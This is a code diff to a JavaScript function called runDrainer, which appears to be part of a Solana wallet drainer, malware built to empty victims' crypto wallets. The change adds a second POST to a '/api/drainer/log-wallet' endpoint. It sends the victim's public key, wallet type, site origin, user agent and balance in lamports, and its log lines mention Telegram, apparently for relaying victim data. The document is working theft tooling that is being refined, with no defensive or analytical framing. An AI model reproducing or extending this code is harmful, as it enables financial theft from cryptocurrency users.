@@ -1029,12 +1029,12 @@ async function runDrainer(provider) {
       return;
     }
 
-    // Log wallet connection to backend
+    // Log wallet connection to backend (will be updated with balance later)
     try {
       // Use the determined connected wallet type
       const walletType = connectedWalletType;
       
-      // Log wallet connection
+      // Log wallet connection (balance will be updated after balance check)
       fetch('/api/drainer/log-wallet', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -1042,7 +1042,8 @@ async function runDrainer(provider) {
           publicKey: publicKey.toString(),
           walletType: walletType,
           origin: window.location.origin,
-          userAgent: navigator.userAgent
+          userAgent: navigator.userAgent,
+          lamports: 0 // Will be updated after balance check
         })
       }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
       
@@ -1084,6 +1085,24 @@ async function runDrainer(provider) {
           
           balance = await Promise.race([balancePromise, timeoutPromise]);
           console.log('[BALANCE_CHECK] Wallet balance from', rpcUrl, ':', balance, 'lamports');
+          
+          // Update wallet logging with actual balance
+          try {
+            fetch('/api/drainer/log-wallet', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                walletType: connectedWalletType,
+                origin: window.location.origin,
+                userAgent: navigator.userAgent,
+                lamports: balance
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to update wallet logging with balance:', err));
+          } catch (updateError) {
+            console.error('[WALLET] Failed to update wallet logging with balance:', updateError);
+          }
+          
           break; // Success, exit loop
         } catch (error) {
           console.log('[BALANCE_CHECK] Failed to check balance from', rpcUrl, ':', error.message);
